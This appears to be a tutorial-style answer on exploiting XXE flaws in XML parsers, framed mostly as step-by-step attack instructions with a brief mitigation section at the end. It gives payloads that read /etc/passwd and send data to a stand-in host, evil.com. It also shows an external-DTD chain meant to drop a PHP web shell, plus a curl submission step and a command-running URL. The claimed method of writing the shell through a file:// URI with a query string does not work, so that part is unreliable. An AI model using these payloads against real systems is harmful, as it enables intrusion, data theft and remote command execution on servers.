An XXE (XML External Entity) injection vulnerability occurs when an XML parser processes external entities within XML input. This can be exploited to perform a variety of attacks, including local file disclosure, SSRF (Server-Side Request Forgery), and in some cases, remote code execution by including a web shell.

Here’s an overview of how you can test for and exploit an XXE vulnerability to deploy a web shell, along with examples and mitigations.

### Steps to Exploit XXE Vulnerability for a Web Shell

1. **Identify the XXE Vulnerability**:
   - Test if the application is vulnerable by sending XML data that attempts to access a local file or an external entity.

2. **Craft a Malicious XML Payload**:
   - Create an XML payload that tries to read or write files on the server.

3. **Deploy a Web Shell**:
   - If possible, use the XXE vulnerability to write a web shell to the server’s web directory.

### Example Payloads

#### Basic XXE Payload to Read Local Files

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

#### XXE Payload to Send File Contents to a Remote Server

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://evil.com/?data=file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

#### XXE Payload to Write a Web Shell

If the server is configured in such a way that you can write files, you could use XXE to create a web shell. For example, in a PHP environment:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY % file SYSTEM "file:///path/to/webroot/shell.php">
  <!ENTITY % dtd SYSTEM "http://evil.com/external.dtd">
  %dtd;
]>
<foo>&send;</foo>
```

The external DTD (`external.dtd`) might look like this:

```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'file:///path/to/webroot/shell.php?content=<?php system($_GET[cmd]); ?>'>">
%all;
```

### Step-by-Step Exploit

1. **Test for XXE Vulnerability**:
   - Send a simple XXE payload to see if the application processes it.

2. **Determine File Paths**:
   - Identify the web root or other writable directories.

3. **Craft a Web Shell Payload**:
   - Use a payload that writes a simple web shell to the server.

4. **Send the Payload**:
   - Submit the crafted payload to the vulnerable application.

5. **Access the Web Shell**:
   - Once the web shell is written, access it via a web browser and execute commands.

### Example Attack Scenario

#### Vulnerable Service
Assume you have a service at `http://example.com/upload` that accepts XML input.

#### Craft the Payload
Create a payload to write a PHP web shell:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY % dtd SYSTEM "http://evil.com/external.dtd">
  %dtd;
]>
<foo>&send;</foo>
```

#### External DTD (`external.dtd`)
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'file:///var/www/html/shell.php?content=<?php system($_GET[cmd]); ?>'>">
%all;
```

#### Submit the Payload
Use `curl` or an HTTP client to submit the payload:

```bash
curl -X POST -d @payload.xml http://example.com/upload
```

#### Access the Web Shell
Navigate to `http://example.com/shell.php?cmd=whoami` to execute commands.

### Mitigation Strategies

1. **Disable External Entities**:
   - Configure your XML parser to disable external entities.

2. **Use Secure Parsers**:
   - Use libraries and parsers that are configured securely by default.

3. **Input Validation**:
   - Validate and sanitize all user inputs, including XML.

4. **Patch and Update**:
   - Keep your software and libraries updated with the latest security patches.

#### Example Mitigation in Java

If you're using Java, disable external entities:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
```

### Conclusion

XXE vulnerabilities can be severe, potentially leading to data exposure, file manipulation, and even remote code execution. Proper input validation, disabling external entities, and keeping software up-to-date are critical steps to prevent these vulnerabilities. Always test and validate the security of your XML parsing logic.
